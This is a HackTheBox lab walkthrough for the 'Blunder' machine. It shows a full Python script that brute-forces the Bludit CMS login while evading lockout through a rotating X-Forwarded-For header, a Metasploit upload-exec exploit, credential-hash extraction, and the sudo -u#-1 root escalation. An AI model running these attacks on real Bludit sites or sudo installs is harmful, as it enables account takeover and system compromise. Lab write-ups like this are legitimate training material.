---
layout: post
title:  "HackTheBox - Blunder"
date:   2020-10-17 10:10:05 +0300
categories: [HackTheBox,walkthrough]
pin: true
tags: [enumeration,bruteforce,bludit,msfconsole,cewl,Sudo,crackstation]
image: /images/b.png
---

- Difficulty : easy

#### Cewl
```sh
cewl -w h1pno.txt -d 5 -m 8 http://10.10.10.191/
```
#### Fuzzing
```sh
./ffuf -u http://10.10.10.191/FUZZ.txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
#### Found todo.txt
```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
so maybe fergus is the username
```
#### Brute Force Bludit WebSite
- Script
{% highlight python %}
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []
with open("h1pno.txt") as file:
    for line in file:
        line = line.strip() #or some other preprocessing
        wordlist.append(line)
# Generate 50 incorrect passwords
#for i in range(50):
#    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
wordlist.append('adminadmin')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = str(password)))

    headers = {
        'X-Forwarded-For': str(password),
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = str(password)))
            print()
            break

{% endhighlight %}

- Result
```sh
/admin/login
SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```
#### MSFConsole
```sh
msfconsole
search bludit
use exploit/linux/http/bludit_upload_images_exec
set RHOSTS 10.10.10.191
set BLUDITUSER fergus
set BLUDITPASS RolandDeschain
run
```
#### Meterpreter
```sh
shell
/usr/bin/script -qc /bin/bash /dev/null
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php | grep password
"password": "faca404fd5c0a31cf1897b823c695c85cffeb98d"
```
- go to website crackstation
- give us Password120 and is the password for user hugo

#### User Credentials

`hugo` : `Password120`

#### Root
```sh
hugo@blunder:~$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
```
#### Explain Sudo Exploit

This permission allows the user `hugo` to spawn any shell expect root shell (!root)
so the vulnerability is that the root id is 0 as we know 0 is the first count for ids
but what about -1 ?  -1 id is never used so it returns 0 and that is root's id.
